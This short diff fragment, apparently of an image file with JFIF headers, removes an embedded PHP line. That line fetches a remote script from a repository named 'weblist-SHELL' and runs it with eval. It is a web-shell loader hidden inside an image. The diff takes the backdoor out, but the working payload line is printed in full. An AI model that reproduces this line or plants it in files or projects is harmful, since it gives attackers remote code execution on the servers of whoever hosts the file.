@@ -4,7 +4,6 @@
 JFIF      $
  JFIF      $
  JFIF      $
-<?php eval("?>".file_get_contents("https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/index.php"));?>
 JFIF      $
 JFIF      $
 
